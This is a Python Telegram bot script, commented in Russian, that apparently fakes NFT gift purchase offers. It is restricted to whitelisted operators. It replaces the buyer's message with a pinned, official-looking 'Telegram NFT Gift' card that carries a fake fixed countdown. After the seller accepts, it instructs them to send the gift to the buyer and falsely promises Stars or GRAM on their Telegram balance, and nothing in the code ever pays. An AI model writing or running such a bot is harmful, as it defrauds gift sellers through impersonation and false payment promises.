import os
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from datetime import datetime, timedelta
from dotenv import load_dotenv

# Загрузка переменных окружения
load_dotenv()

# Токен бота (замените на свой или используйте .env файл)
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")

# Список разрешенных пользователей (добавьте ID пользователей, которым разрешен доступ)
allowed_users_env = os.getenv("ALLOWED_USERS", "")
ALLOWED_USERS = [int(uid.strip()) for uid in allowed_users_env.split(",") if uid.strip()]

# Хранилище активных офферов
active_offers = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /start"""
    user = update.effective_user
    
    # Проверка доступа
    if ALLOWED_USERS and user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Доступ запрещён.")
        return
    
    welcome_text = f"""✅ Доступ разрешён.

Привет, {user.first_name}

Отправляйте сумма ссылка_на_NFT в чат продавца NFT подарка

💎 Оффер в GRAM — добавьте слово gram:
700 https://t.me/nft/IceCream-38973 gram

Для звёзд в конце надо написать stars

Цена в карточке будет в 💎 вместо ⭐."""
    
    await update.message.reply_text(welcome_text)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик всех текстовых сообщений"""
    if not update.message or not update.message.text:
        return
    
    text = update.message.text
    user = update.effective_user
    chat = update.effective_chat
    
    # Игнорируем сообщения в личных чатах с ботом (кроме команд)
    if chat.type == "private":
        return
    
    # Регулярное выражение для поиска офферов
    # Формат: число ссылка_на_NFT [gram|stars]
    pattern = r'(\d+)\s+(https?://\S+)\s*(gram|stars)?'
    match = re.search(pattern, text, re.IGNORECASE)
    
    if match:
        amount = match.group(1)
        nft_link = match.group(2)
        currency = match.group(3).lower() if match.group(3) else 'stars'
        
        # Извлекаем название NFT из ссылки
        nft_name = extract_nft_name(nft_link)
        
        # Определяем валютный символ
        currency_symbol = "💎" if currency == "gram" else "⭐"
        
        # Получаем информацию о покупателе
        buyer_name = user.first_name
        if user.last_name:
            buyer_name += f" {user.last_name}"
        
        # Создаем красивое сообщение с офером
        offer_text = f"""╭─────────────────╮
│  Telegram NFT Gift  │
╰─────────────────╯

🎁 {nft_name}

─────────────────

💰 Предлагает Вам {amount} {currency_symbol} за подарок {nft_name}.

👤 Покупатель: {buyer_name}
🔗 Ссылка: [Открыть NFT]({nft_link})

⏰ Действует еще 54 мин. 59 сек."""
        
        # Создаем кнопки
        keyboard = [
            [
                InlineKeyboardButton("❌ Отклонить", callback_data=f"reject_{user.id}"),
                InlineKeyboardButton("✅ Принять", callback_data=f"accept_{user.id}_{amount}_{currency}")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Удаляем оригинальное сообщение
        try:
            await update.message.delete()
        except Exception as e:
            print(f"Не удалось удалить сообщение: {e}")
        
        # Отправляем новое сообщение с офером
        try:
            sent_message = await context.bot.send_message(
                chat_id=chat.id,
                text=offer_text,
                reply_markup=reply_markup,
                parse_mode='Markdown',
                disable_web_page_preview=False
            )
            
            # Закрепляем сообщение
            try:
                await context.bot.pin_chat_message(
                    chat_id=chat.id,
                    message_id=sent_message.message_id,
                    disable_notification=True
                )
            except Exception as e:
                print(f"Не удалось закрепить сообщение: {e}")
            
            # Сохраняем информацию об оффере
            active_offers[sent_message.message_id] = {
                'buyer_id': user.id,
                'buyer_name': buyer_name,
                'buyer_username': user.username,
                'amount': amount,
                'currency': currency,
                'currency_symbol': currency_symbol,
                'nft_name': nft_name,
                'nft_link': nft_link,
                'chat_id': chat.id,
                'seller_id': chat.id,
                'created_at': datetime.now(),
                'status': 'pending'
            }
            
        except Exception as e:
            print(f"Ошибка при отправке сообщения: {e}")
            # Если не удалось отправить, возвращаем оригинальное сообщение
            await update.message.reply_text(
                "❌ Произошла ошибка при обработке оффера. Проверьте права бота."
            )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик нажатий на кнопки"""
    query = update.callback_query
    
    data = query.data
    message_id = query.message.message_id
    user_id = query.from_user.id
    
    # Проверяем, есть ли оффер в хранилище
    if message_id not in active_offers:
        await query.answer("Оффер не найден", show_alert=True)
        return
    
    offer = active_offers[message_id]
    
    if data.startswith("reject_confirm"):
        # Окончательное отклонение
        await query.answer()
        
        # Обновляем сообщение
        rejected_text = f"""❌ Оффер отклонён.

Вы отклонили предложение на {offer['nft_name']} за {offer['amount']} {offer['currency_symbol']}."""
        
        await query.edit_message_text(text=rejected_text)
        
        # Уведомляем покупателя
        try:
            await context.bot.send_message(
                chat_id=offer['buyer_id'],
                text=f"""❌ Ваш оффер был отклонён.

Продавец отклонил ваше предложение на {offer['nft_name']} за {offer['amount']} {offer['currency_symbol']}."""
            )
        except Exception as e:
            print(f"Не удалось отправить сообщение покупателю: {e}")
        
        # Открепляем сообщение
        try:
            await context.bot.unpin_chat_message(
                chat_id=query.message.chat_id,
                message_id=message_id
            )
        except Exception as e:
            print(f"Не удалось открепить сообщение: {e}")
        
        # Удаляем из активных офферов
        del active_offers[message_id]
        
    elif data.startswith("reject_"):
        # Показываем подтверждение отклонения
        await query.answer(
            "Вы точно уверены что хотите отклонить предложение?",
            show_alert=True
        )
        
        # Добавляем кнопку подтверждения
        keyboard = [
            [
                InlineKeyboardButton("Отмена", callback_data=f"cancel_reject_{offer['buyer_id']}"),
                InlineKeyboardButton("OK", callback_data=f"reject_confirm_{offer['buyer_id']}")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_reply_markup(reply_markup=reply_markup)
        
    elif data.startswith("cancel_reject"):
        # Отмена отклонения - возвращаем исходные кнопки
        await query.answer("Отклонение отменено")
        
        keyboard = [
            [
                InlineKeyboardButton("❌ Отклонить", callback_data=f"reject_{offer['buyer_id']}"),
                InlineKeyboardButton("✅ Принять", callback_data=f"accept_{offer['buyer_id']}_{offer['amount']}_{offer['currency']}")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_reply_markup(reply_markup=reply_markup)
        
    elif data.startswith("accept_"):
        # Обработка принятия
        await query.answer()
        
        parts = data.split("_")
        buyer_id = int(parts[1])
        amount = parts[2]
        currency = parts[3]
        
        currency_symbol = "💎" if currency == "gram" else "⭐"
        
        # Обновляем сообщение - меняем на инструкцию
        updated_text = f"""⭐ Сделка подтверждена.

Передайте {offer['nft_name']} покупателю, чтобы получить {amount} {currency_symbol} на баланс Telegram в течение 30 минут.

Инструкция: Перейдите в профиль покупателя ➡️
Нажмите на "еще" ➡️ "Отправить подарок" ➡️
Выберите подарок

Осталось 30 м."""
        
        # Добавляем кнопку "Я передал(а)"
        keyboard = [
            [InlineKeyboardButton("🎁 Я передал(а)", callback_data=f"transferred_{buyer_id}_{message_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text=updated_text,
            reply_markup=reply_markup
        )
        
        # Показываем предупреждение
        warning_msg = await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="""⚠️ Внимание!

Следуйте инструкции, чтобы не потерять подарок и получить звёзды ⭐.

Нажмите «Ок», если вы прочитали это сообщение."""
        )
        
        # Уведомляем покупателя о принятии
        try:
            await context.bot.send_message(
                chat_id=buyer_id,
                text=f"""✅ Ваш оффер принят!

Продавец принял ваше предложение на {offer['nft_name']} за {amount} {currency_symbol}.

Ожидайте получения подарка в течение 30 минут."""
            )
        except Exception as e:
            print(f"Не удалось отправить сообщение покупателю: {e}")
        
        # Сохраняем статус принятия
        offer['status'] = 'accepted'
        offer['accepted_at'] = datetime.now()
        
    elif data.startswith("transferred_"):
        # Обработка подтверждения передачи
        parts = data.split("_")
        buyer_id = int(parts[1])
        original_msg_id = int(parts[2])
        
        # Проверяем, что нажал продавец (владелец чата)
        # В групповых чатах можно добавить дополнительную проверку прав
        
        await query.answer(
            "Проверить передачу может только владелец сделки",
            show_alert=True
        )
        
        # Обновляем сообщение
        completed_text = f"""✅ Передача подтверждена.

Подарок {offer['nft_name']} передан покупателю.

Ожидайте поступления {offer['amount']} {offer['currency_symbol']} на баланс в течение 30 минут."""
        
        await query.edit_message_text(text=completed_text)
        
        # Отправляем уведомление покупателю с возможностью проверки
        try:
            keyboard = [
                [InlineKeyboardButton("✅ Подтвердить получение", callback_data=f"confirm_received_{original_msg_id}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await context.bot.send_message(
                chat_id=buyer_id,
                text=f"""🎁 Подарок передан!

Продавец сообщает, что передал вам {offer['nft_name']}.

Проверьте свои подарки и подтвердите получение.""",
                reply_markup=reply_markup
            )
        except Exception as e:
            print(f"Не удалось отправить сообщение покупателю: {e}")
        
        # Обновляем статус
        offer['status'] = 'transferred'
        offer['transferred_at'] = datetime.now()
        
    elif data.startswith("confirm_received_"):
        # Покупатель подтверждает получение
        original_msg_id = int(data.split("_")[2])
        
        await query.answer("Спасибо за подтверждение! ✅")
        
        # Обновляем сообщение покупателя
        await query.edit_message_text(
            text=f"""✅ Получение подтверждено.

Вы подтвердили получение подарка {offer['nft_name']}.

Сделка завершена успешно! 🎉"""
        )
        
        # Уведомляем продавца
        try:
            await context.bot.send_message(
                chat_id=offer['chat_id'],
                text=f"""✅ Сделка завершена!

Покупатель подтвердил получение {offer['nft_name']}.

{offer['amount']} {offer['currency_symbol']} будут зачислены на ваш баланс."""
            )
        except Exception as e:
            print(f"Не удалось отправить сообщение продавцу: {e}")
        
        # Открепляем сообщение
        try:
            await context.bot.unpin_chat_message(
                chat_id=offer['chat_id'],
                message_id=original_msg_id
            )
        except Exception as e:
            print(f"Не удалось открепить сообщение: {e}")
        
        # Удаляем из активных офферов
        if original_msg_id in active_offers:
            del active_offers[original_msg_id]
    
    elif data.startswith("cancel_offer_"):
        # Отмена оффера покупателем
        msg_id = int(data.split("_")[2])
        
        if msg_id not in active_offers:
            await query.answer("Оффер не найден", show_alert=True)
            return
        
        offer = active_offers[msg_id]
        
        # Проверяем, что отменяет владелец оффера
        if query.from_user.id != offer['buyer_id']:
            await query.answer("Вы не можете отменить чужой оффер", show_alert=True)
            return
        
        try:
            # Удаляем сообщение с оффером
            await context.bot.delete_message(
                chat_id=offer['chat_id'],
                message_id=msg_id
            )
            
            # Удаляем из активных
            del active_offers[msg_id]
            
            await query.answer(f"Оффер на {offer['nft_name']} отменён", show_alert=True)
            
            # Удаляем сообщение с кнопками выбора
            await query.message.delete()
            
        except Exception as e:
            await query.answer(f"Ошибка при отмене: {e}", show_alert=True)

def extract_nft_name(url):
    """Извлекает название NFT из ссылки"""
    # Попытка извлечь название из URL
    # Например: https://t.me/nft/IceCream-38973 -> IceCream #38973
    match = re.search(r'/([^/]+?)(?:-|#)?(\d+)/?$', url)
    if match:
        name = match.group(1).replace('_', ' ').replace('-', ' ')
        number = match.group(2)
        return f"{name} #{number}"
    return "NFT Gift"

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /help"""
    help_text = """📖 Справка по боту

**Для покупателя:**
Отправьте продавцу оффер в формате:
`сумма ссылка_на_NFT [gram|stars]`

Примеры:
• `700 https://t.me/nft/IceCream-38973 gram`
• `500 https://t.me/nft/Socks-12345 stars`

**Валюты:**
💎 GRAM - добавьте `gram` в конце
⭐ Stars - добавьте `stars` или оставьте пустым

**Для продавца:**
• Нажмите "Принять" для принятия оффера
• Нажмите "Отклонить" для отклонения
• После принятия передайте подарок и нажмите "Я передал(а)"

Команды:
/start - Начало работы
/help - Эта справка
/myoffers - Мои активные офферы
"""
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def my_offers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показать активные офферы пользователя"""
    user_id = update.effective_user.id
    
    # Ищем офферы пользователя
    user_offers = []
    for msg_id, offer in active_offers.items():
        if offer['buyer_id'] == user_id:
            user_offers.append((msg_id, offer))
    
    if not user_offers:
        await update.message.reply_text("У вас нет активных офферов.")
        return
    
    response = "📋 Ваши активные офферы:\n\n"
    
    for msg_id, offer in user_offers:
        time_diff = datetime.now() - offer['created_at']
        minutes = int(time_diff.total_seconds() / 60)
        
        status_emoji = {
            'pending': '⏳',
            'accepted': '✅',
            'transferred': '🎁',
            'rejected': '❌'
        }.get(offer.get('status', 'pending'), '⏳')
        
        response += f"""{status_emoji} **{offer['nft_name']}**
Сумма: {offer['amount']} {offer['currency_symbol']}
Статус: {offer.get('status', 'pending')}
Создан: {minutes} мин. назад

"""
    
    await update.message.reply_text(response, parse_mode='Markdown')

async def cancel_offer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отменить оффер (только для покупателя)"""
    user_id = update.effective_user.id
    
    # Проверяем, есть ли активные офферы
    user_offers = [(msg_id, offer) for msg_id, offer in active_offers.items() 
                   if offer['buyer_id'] == user_id and offer.get('status') == 'pending']
    
    if not user_offers:
        await update.message.reply_text("У вас нет активных офферов для отмены.")
        return
    
    # Если есть только один оффер, отменяем его сразу
    if len(user_offers) == 1:
        msg_id, offer = user_offers[0]
        
        try:
            # Удаляем сообщение с оффером
            await context.bot.delete_message(
                chat_id=offer['chat_id'],
                message_id=msg_id
            )
            
            # Удаляем из активных
            del active_offers[msg_id]
            
            await update.message.reply_text(f"✅ Оффер на {offer['nft_name']} отменён.")
        except Exception as e:
            await update.message.reply_text(f"❌ Ошибка при отмене: {e}")
    else:
        # Если несколько офферов, показываем список с кнопками
        keyboard = []
        for msg_id, offer in user_offers:
            keyboard.append([
                InlineKeyboardButton(
                    f"Отменить: {offer['nft_name']} - {offer['amount']} {offer['currency_symbol']}",
                    callback_data=f"cancel_offer_{msg_id}"
                )
            ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Выберите оффер для отмены:",
            reply_markup=reply_markup
        )

def main():
    """Запуск бота"""
    # Проверка токена
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ОШИБКА: Не установлен токен бота!")
        print("Пожалуйста, установите токен в .env файле или в переменной BOT_TOKEN")
        return
    
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики команд
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("myoffers", my_offers_command))
    application.add_handler(CommandHandler("cancel", cancel_offer_command))
    
    # Регистрируем обработчики сообщений и кнопок
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Запускаем бота
    print("✅ Бот запущен и готов к работе...")
    print(f"👤 Разрешённые пользователи: {ALLOWED_USERS if ALLOWED_USERS else 'Все'}")
    print("━" * 50)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
